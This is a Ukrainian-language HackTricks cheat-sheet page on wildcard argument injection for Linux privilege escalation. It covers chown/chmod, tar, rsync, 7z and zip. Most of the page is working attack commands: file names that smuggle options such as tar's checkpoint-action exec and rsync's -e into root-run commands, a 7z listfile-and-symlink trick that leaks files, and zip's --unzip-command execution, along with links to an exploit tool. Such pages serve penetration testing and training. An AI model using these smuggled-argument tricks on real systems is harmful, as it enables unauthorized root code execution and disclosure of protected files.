{{#include ../../banners/hacktricks-training.md}}

## chown, chmod

Ви можете **вказати, якого власника файлу та дозволи ви хочете скопіювати для решти файлів**
```bash
touch "--reference=/my/own/path/filename"
```
Ви можете експлуатувати це, використовуючи [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(комбінована атака)_\
Більше інформації в [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Виконати довільні команди:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Ви можете експлуатувати це, використовуючи [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_\
Більше інформації в [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Виконати довільні команди:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Ви можете експлуатувати це, використовуючи [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_атака)_\
Більше інформації в [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

У **7z** навіть використовуючи `--` перед `*` (зауважте, що `--` означає, що наступний ввід не може бути розглянутий як параметри, тому в цьому випадку лише шляхи до файлів) ви можете викликати довільну помилку для читання файлу, тому якщо команда, подібна до наступної, виконується root:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
І ви можете створювати файли в папці, де це виконується, ви можете створити файл `@root.txt` і файл `root.txt`, який є **symlink** на файл, який ви хочете прочитати:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Тоді, коли **7z** виконується, він буде розглядати `root.txt` як файл, що містить список файлів, які він повинен стиснути (саме це вказує на наявність `@root.txt`), і коли 7z читає `root.txt`, він прочитає `/file/you/want/to/read`, і **оскільки вміст цього файлу не є списком файлів, він видасть помилку**, показуючи вміст.

_Більше інформації в Write-ups of the box CTF from HackTheBox._

## Zip

**Виконати довільні команди:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{{#include ../../banners/hacktricks-training.md}}
